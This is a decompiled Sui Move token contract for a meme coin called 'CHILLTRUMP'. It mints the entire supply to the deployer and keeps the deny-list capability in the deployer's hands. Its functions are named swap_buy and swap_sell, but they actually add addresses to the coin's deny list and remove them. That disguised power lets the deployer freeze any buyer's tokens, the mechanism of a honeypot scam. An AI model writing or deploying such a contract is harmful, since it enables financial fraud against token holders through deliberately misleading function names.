module 0x245863acf1f181a1e3f7d8a2f6c6eb53062d42f5d3446cedca6cdf9cccb7d716::chilltrump {
    struct CHILLTRUMP has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CHILLTRUMP, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHILLTRUMP>(arg0, 9, b"CHILLTRUMP", b"Just a chill Trump", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmXNJ1zQfKNn1z8Eiq6vASP7N24d4PpnL83zbwWj2vYD1G"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHILLTRUMP>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHILLTRUMP>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CHILLTRUMP>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHILLTRUMP>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLTRUMP>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHILLTRUMP>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLTRUMP>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHILLTRUMP>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

